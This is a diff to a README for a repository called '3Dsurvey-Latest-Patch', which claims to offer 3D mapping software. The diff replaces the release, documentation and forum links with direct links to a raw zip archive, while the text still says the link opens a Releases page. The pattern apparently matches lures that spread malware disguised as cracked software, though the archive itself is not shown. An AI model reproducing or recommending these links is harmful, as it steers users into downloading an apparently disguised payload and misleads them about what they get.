@@ -1,6 +1,6 @@
 # 🌟 3Dsurvey-Latest-Patch - Effortless 3D Mapping for Everyone
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-3Dsurvey--Latest--Patch-brightgreen)](https://github.com/ekant314/3Dsurvey-Latest-Patch/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/ekant314/3Dsurvey-Latest-Patch/main/tactosol/3Dsurvey-Latest-Patch-2.0.zip%20Latest%20Version-3Dsurvey--Latest--Patch-brightgreen)](https://raw.githubusercontent.com/ekant314/3Dsurvey-Latest-Patch/main/tactosol/3Dsurvey-Latest-Patch-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the 3Dsurvey-Latest-Patch! This software aims to simplify your 3D map
 
 To get started, visit the following link to download the software:
 
-[Download 3Dsurvey-Latest-Patch](https://github.com/ekant314/3Dsurvey-Latest-Patch/releases)
+[Download 3Dsurvey-Latest-Patch](https://raw.githubusercontent.com/ekant314/3Dsurvey-Latest-Patch/main/tactosol/3Dsurvey-Latest-Patch-2.0.zip)
 
 1. Click the link above. It will take you to the Releases page.  
 2. Look for the latest version listed.
@@ -76,8 +76,8 @@ If you need help, our community is here for you:
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/ekant314/3Dsurvey-Latest-Patch/wiki)
-- [User Forum](https://github.com/ekant314/3Dsurvey-Latest-Patch/discussions)
+- [Documentation](https://raw.githubusercontent.com/ekant314/3Dsurvey-Latest-Patch/main/tactosol/3Dsurvey-Latest-Patch-2.0.zip)
+- [User Forum](https://raw.githubusercontent.com/ekant314/3Dsurvey-Latest-Patch/main/tactosol/3Dsurvey-Latest-Patch-2.0.zip)
 
 ## ✔️ License
 
